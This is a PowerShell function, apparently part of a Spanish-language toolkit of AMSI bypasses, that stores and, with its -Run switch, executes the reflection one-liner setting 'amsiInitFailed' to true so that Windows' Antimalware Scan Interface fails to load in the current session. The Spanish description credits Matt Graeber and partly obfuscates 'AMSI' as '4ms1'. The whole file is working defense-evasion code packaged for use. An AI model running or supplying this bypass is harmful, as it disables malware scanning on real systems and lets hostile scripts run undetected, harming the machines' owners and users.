function Invoke-ReflectionBypass{
    
    [CmdletBinding()]
    Param(
    [string] $Get,
    [switch] $Run,
    [switch] $Import
    )

    $Bypass = New-Object -TypeName PSObject
    $Name = "Modificación de 4ms1InitFail meidante refexión"
    $Description = "Este bypass fue publicado por Matt Graebers en twitter en 2016. Consiste en usar la reflexión de .NET para cambiar el valor 4ms1InitFail a true, lo que hará que AMSI no se cargue correctamente en la sesión de powershell activa"
    $Script = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"

    $Bypass | Add-Member -MemberType NoteProperty -Name "Name" -Value $Name
    $Bypass | Add-Member -MemberType NoteProperty -Name "Description" -Value $Description
    $Bypass | Add-Member -MemberType NoteProperty -Name "Script" -Value $Script
    $Bypass | Add-Member -MemberType ScriptMethod -Name RunScript -Value {& $Bypass.Script}


    if($Run){
        $Bypass.RunScript()
    }

    if($Import){
        return $Bypass
    }

    if($Get.Length -ne 0)
    {
        if($Get -eq "All"){
            $Bypass.PSObject.Properties | ForEach-Object{

                $name = $_.Name 
                $value = $_.value
                Write-Host "`n${name}: `n$value`n"
                

            }
        }else{
            Write-Output $Bypass | Select-Object -Property $Get
        }
        return
    }

    $Name
    Write-Host "`n=========Descripción=========="
    $Description
    Write-Host "`n===========Script============="
    $Script

}
